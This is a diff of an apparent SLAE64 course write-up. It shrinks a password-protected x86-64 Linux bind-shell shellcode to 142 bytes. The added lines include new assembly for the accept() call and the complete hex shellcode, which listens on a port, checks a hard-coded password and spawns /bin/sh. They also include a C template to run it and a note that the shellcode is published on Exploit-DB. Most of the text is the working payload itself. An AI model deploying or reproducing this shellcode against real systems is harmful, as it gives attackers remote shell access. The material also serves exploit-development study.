@@ -344,7 +344,7 @@ SLAE64> echo “\"$(objdump -d 0_BindShell-ExecveStack.o | grep '[0-9a-f]:' |
 SLAE64> 
 ```
 
-But still the shellcode size can be reduced: the original code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction that has an opcode that uses 7 bytes. For this the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. The new code for the Password Stuff section after appliying changes is:
+But still the shellcode size can be reduced. V1 code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction that has an opcode that uses 7 bytes. For this the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. The new code for the Password Stuff section after appliying changes is:
 ```asm
 write_syscall:
 
@@ -389,29 +389,42 @@ compare_passwords:
         jne exit_program                        ; Passwords don't match, exit
 
 ```
+Also, the code for the `close()` can be removed, as the socket descriptor is not used anymore once the `accept()` get a connection. 
 
-Using the one liner command for `objdump` the shellcode is dumped, this time, with a size of 155 bytes:
+**_UPDATE_** Now let's use a trick learned from [Assignment05-1](Assignment05_1). For the `accept()` call, the value returned for `&client` and `&sockaddr_len` can be NULL. If this is done, then no info is filled in the sockaddr struct, and this is not a problem as this data is not used in the code, just use the returned sock descriptor in RAX. In `man 2 accept` this is explained. Then, the code for the `accept()` section ends like this:
+```asm
+; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
+        ;       RDI already has the sock_id
+
+        ;mov rax, 43                    ; syscall number
+        push 43
+        pop rax
+        xor rsi, rsi                    ; RSI <- NULL
+        cdq                             ; RDX <- NULL
+        syscall
+        ; Store the client socket descripion returned by accept
+        push rax
+        pop rdi
+```
+
+Using the one liner command for `objdump` the shellcode is dumped, this time, with a size of **only 142 bytes**:
 
 ```markdown
 SLAE64> echo “\"$(objdump -d BindShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
               cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
-
 "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68"
 "\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e"
-"\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05\x50\x5b\x6a"
-"\x03\x58\x0f\x05\x53\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a"
-"\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x48\x89\xe6\x6a\x08\x5a"
-"\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37"
-"\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
-"\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58\x0f\x05"
-
+"\x0f\x05\x6a\x2b\x58\x48\x31\xf6\x99\x0f\x05\x50\x5f\x6a\x02\x5e\x6a\x21\x58\x0f"
+"\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41"
+"\x51\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb"
+"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58"
+"\x0f\x05"
 SLAE64>
 ```
 
-This shellcode could be more reduced:
-- Removing the code for `close()` the socket descriptor: Why to care about the resources left open in the victim?
-- Removing the code for the `"Passwd: "` prompt: Why needed? We already know that a password has to be typed in
-But won't do it as the reached size for the shellcode is good enought with 155 bytes
+This shellcode could be more reduced by removing the code for the `"Passwd: "` prompt: Why needed? We already know that a password has to be typed in.
+But won't do it, as the reached size for the shellcode is good enought with **only 142 bytes**.
 
 ### Executing Final Shellcode
 ---
@@ -436,15 +449,14 @@ To use it, the generated shellcode has to be placed in the `unsigned char code[]
 #include <string.h>
 
 unsigned char code[]= \
-"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66"
-"\x68\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a"
-"\x02\x5e\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05"
-"\x50\x5b\x6a\x03\x58\x0f\x05\x53\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff"
-"\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x48"
-"\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31"
-"\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb"
-"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b"
-"\x58\x0f\x05";
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68"
+"\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e"
+"\x0f\x05\x6a\x2b\x58\x48\x31\xf6\x99\x0f\x05\x50\x5f\x6a\x02\x5e\x6a\x21\x58\x0f"
+"\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41"
+"\x51\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb"
+"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58"
+"\x0f\x05";
 
 void main()
 {
@@ -461,13 +473,15 @@ The shellcode can be executed, and using `netcat`, a connection is opened to the
 
 <img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_V2_Exec01.png" width="75%" height="75%">
 
-### GitHub Repo Files
+### GitHub Repo Files and ExploitDB Submission
 ---
 The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment01) for this assignment contains the following files:
 
 - [BindShell-ExecveStack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment01/BindShell-ExecveStack.nasm) : This is the ASM source code for the first version of the code. It's with NULLs and not caring on the shellcode size, but is more clear to understand the code.
 - [BindShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment01/BindShell-ExecveStack_V2.nasm) : This is the NULL free code with the shellcode size reduced.
 - [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment01/shellcode.c) : The C template with the V2 of the shellcode to run and execute
+
+Also, this shellcode has been published at [Exploit-DB](https://www.exploit-db.com/), at [https://www.exploit-db.com/shellcodes/49442](https://www.exploit-db.com/shellcodes/49442)
 
 ### The End
 ---
